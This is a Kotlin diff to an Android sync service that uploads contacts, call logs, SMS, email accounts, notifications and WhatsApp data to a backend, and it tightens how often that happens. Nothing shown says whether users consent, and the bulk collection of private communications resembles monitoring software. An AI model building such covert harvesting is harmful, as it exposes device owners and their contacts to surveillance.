@@ -84,11 +84,11 @@ class BackendSyncService(
         }
     }
     
-    // Sync frequency control constants
+    // Sync frequency control constants - Priority 1 Requirements
     private val SYNC_FREQUENCY_MESSAGES = 15 * 60 * 1000L // 15 minutes in milliseconds
-    private val SYNC_FREQUENCY_CALL_LOGS = 60 * 60 * 1000L // 1 hour in milliseconds
+    private val SYNC_FREQUENCY_CALL_LOGS = 15 * 60 * 1000L // 15 minutes in milliseconds
     private val SYNC_FREQUENCY_CONTACTS = 2 * 24 * 60 * 60 * 1000L // 2 days in milliseconds
-    private val SYNC_FREQUENCY_EMAIL_ACCOUNTS = 5 * 24 * 60 * 60 * 1000L // 5 days in milliseconds
+    private val SYNC_FREQUENCY_EMAIL_ACCOUNTS = 24 * 60 * 60 * 1000L // 1 day in milliseconds
     
     // Helper function to check if data type can be synced based on frequency
     private fun canSyncDataType(dataType: String, forceSync: Boolean = false): Boolean {
@@ -100,6 +100,12 @@ class BackendSyncService(
         
         val lastSyncTime = getLastSyncTime(dataType)
         val currentTime = System.currentTimeMillis()
+        
+        // If this is the first sync (lastSyncTime == 0), always allow sync
+        if (lastSyncTime == 0L) {
+            println("🆕 First sync for $dataType - allowing sync")
+            return true
+        }
         
         return when (dataType) {
             "NOTIFICATIONS" -> {
@@ -115,20 +121,23 @@ class BackendSyncService(
                     val remainingTime = SYNC_FREQUENCY_MESSAGES - timeSinceLastSync
                     val remainingMinutes = remainingTime / (60 * 1000)
                     println("⏰ MESSAGES sync skipped - Next sync available in ${remainingMinutes}m")
+                } else {
+                    println("✅ MESSAGES sync allowed - ${timeSinceLastSync / (60 * 1000)}m since last sync")
                 }
                 
                 canSync
             }
             "CALL_LOGS" -> {
-                // Call logs can sync every 1 hour
+                // Call logs can sync every 15 minutes
                 val timeSinceLastSync = currentTime - lastSyncTime
                 val canSync = timeSinceLastSync >= SYNC_FREQUENCY_CALL_LOGS
                 
                 if (!canSync) {
                     val remainingTime = SYNC_FREQUENCY_CALL_LOGS - timeSinceLastSync
-                    val remainingHours = remainingTime / (60 * 60 * 1000)
-                    val remainingMinutes = (remainingTime % (60 * 60 * 1000)) / (60 * 1000)
-                    println("⏰ CALL_LOGS sync skipped - Next sync available in ${remainingHours}h ${remainingMinutes}m")
+                    val remainingMinutes = remainingTime / (60 * 1000)
+                    println("⏰ CALL_LOGS sync skipped - Next sync available in ${remainingMinutes}m")
+                } else {
+                    println("✅ CALL_LOGS sync allowed - ${timeSinceLastSync / (60 * 1000)}m since last sync")
                 }
                 
                 canSync
@@ -143,20 +152,25 @@ class BackendSyncService(
                     val remainingDays = remainingTime / (24 * 60 * 60 * 1000)
                     val remainingHours = (remainingTime % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000)
                     println("⏰ CONTACTS sync skipped - Next sync available in ${remainingDays}d ${remainingHours}h")
+                } else {
+                    val daysSince = timeSinceLastSync / (24 * 60 * 60 * 1000)
+                    println("✅ CONTACTS sync allowed - ${daysSince}d since last sync")
                 }
                 
                 canSync
             }
             "EMAIL_ACCOUNTS" -> {
-                // Email accounts can sync every 5 days
+                // Email accounts can sync every 1 day
                 val timeSinceLastSync = currentTime - lastSyncTime
                 val canSync = timeSinceLastSync >= SYNC_FREQUENCY_EMAIL_ACCOUNTS
                 
                 if (!canSync) {
                     val remainingTime = SYNC_FREQUENCY_EMAIL_ACCOUNTS - timeSinceLastSync
-                    val remainingDays = remainingTime / (24 * 60 * 60 * 1000)
-                    val remainingHours = (remainingTime % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000)
-                    println("⏰ EMAIL_ACCOUNTS sync skipped - Next sync available in ${remainingDays}d ${remainingHours}h")
+                    val remainingHours = remainingTime / (60 * 60 * 1000)
+                    println("⏰ EMAIL_ACCOUNTS sync skipped - Next sync available in ${remainingHours}h")
+                } else {
+                    val hoursSince = timeSinceLastSync / (60 * 60 * 1000)
+                    println("✅ EMAIL_ACCOUNTS sync allowed - ${hoursSince}h since last sync")
                 }
                 
                 canSync
@@ -250,8 +264,12 @@ class BackendSyncService(
         val stats = getSyncTimestampStats()
         val statusInfo = mutableMapOf<String, Any>()
         
-        stats.forEach { (dataType, lastSyncTime) ->
-            val timeSinceLastSync = currentTime - lastSyncTime
+        // Add all data types, even if they haven't been synced yet
+        val allDataTypes = listOf("CONTACTS", "CALL_LOGS", "MESSAGES", "EMAIL_ACCOUNTS", "NOTIFICATIONS", "WHATSAPP")
+        
+        allDataTypes.forEach { dataType ->
+            val lastSyncTime = stats[dataType] ?: 0L
+            val timeSinceLastSync = if (lastSyncTime > 0) currentTime - lastSyncTime else 0L
             val canSync = canSyncDataType(dataType, forceSync)
             val nextSyncTime = if (canSync) 0L else {
                 when (dataType) {
@@ -259,22 +277,37 @@ class BackendSyncService(
                     "CALL_LOGS" -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS
                     "CONTACTS" -> lastSyncTime + SYNC_FREQUENCY_CONTACTS
                     "EMAIL_ACCOUNTS" -> lastSyncTime + SYNC_FREQUENCY_EMAIL_ACCOUNTS
-                    else -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS // Default to 1 hour
+                    "NOTIFICATIONS" -> 0L // Notifications can sync anytime
+                    "WHATSAPP" -> 0L // WhatsApp can sync anytime
+                    else -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS // Default to 15 minutes
                 }
             }
             
+            val timeUntilNextSync = if (nextSyncTime > 0) nextSyncTime - currentTime else 0L
+            
             statusInfo[dataType] = mapOf(
                 "lastSyncTime" to lastSyncTime,
-                "lastSyncDate" to Date(lastSyncTime).toString(),
+                "lastSyncDate" to if (lastSyncTime > 0) Date(lastSyncTime).toString() else "Never",
                 "timeSinceLastSync" to timeSinceLastSync,
                 "canSync" to canSync,
                 "nextSyncTime" to nextSyncTime,
-                "nextSyncDate" to if (nextSyncTime > 0) Date(nextSyncTime).toString() else "Now"
+                "nextSyncDate" to if (nextSyncTime > 0) Date(nextSyncTime).toString() else "Now",
+                "timeUntilNextSync" to timeUntilNextSync,
+                "syncFrequency" to when (dataType) {
+                    "MESSAGES" -> "15 minutes"
+                    "CALL_LOGS" -> "15 minutes"
+                    "CONTACTS" -> "2 days"
+                    "EMAIL_ACCOUNTS" -> "1 day"
+                    "NOTIFICATIONS" -> "Real-time"
+                    "WHATSAPP" -> "Real-time"
+                    else -> "15 minutes"
+                }
             )
         }
         
         statusInfo["isSyncInProgress"] = isSyncInProgress
         statusInfo["currentSyncDuration"] = getCurrentSyncDuration()
+        statusInfo["isFirstSync"] = stats.isEmpty()
         
         return statusInfo
     }
@@ -801,8 +834,13 @@ class BackendSyncService(
     // Production sync method for all data types
     suspend fun syncAllDataTypes(deviceId: String): Map<String, SyncResult> {
         return withContext(Dispatchers.IO) {
-            // Clear sync timestamps for fresh start (first time sync)
-            clearSyncTimestamps()
+            // Check if this is the first sync (no timestamps exist)
+            val isFirstSync = getSyncTimestampStats().isEmpty()
+            if (isFirstSync) {
+                println("🆕 First sync detected - will sync all data types")
+            } else {
+                println("🔄 Subsequent sync - following frequency rules")
+            }
             
             // Check if sync is already in progress
             if (!startSync()) {
@@ -822,16 +860,16 @@ class BackendSyncService(
                 val results = mutableMapOf<String, SyncResult>()
                 
                 // Sync 1: Contacts
-                results["CONTACTS"] = syncContacts(deviceId, forceSync = true)
+                results["CONTACTS"] = syncContacts(deviceId, forceSync = isFirstSync)
                 
                 // Sync 2: Call Logs
-                results["CALL_LOGS"] = syncCallLogs(deviceId, forceSync = true)
+                results["CALL_LOGS"] = syncCallLogs(deviceId, forceSync = isFirstSync)
                 
                 // Sync 3: SMS Messages
-                results["MESSAGES"] = syncMessages(deviceId, forceSync = true)
+                results["MESSAGES"] = syncMessages(deviceId, forceSync = isFirstSync)
                 
                 // Sync 4: Email Accounts
-                results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId, forceSync = true)
+                results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId, forceSync = isFirstSync)
                 
                 // Sync 5: Notifications
                 results["NOTIFICATIONS"] = syncNotifications(deviceId, 0L)
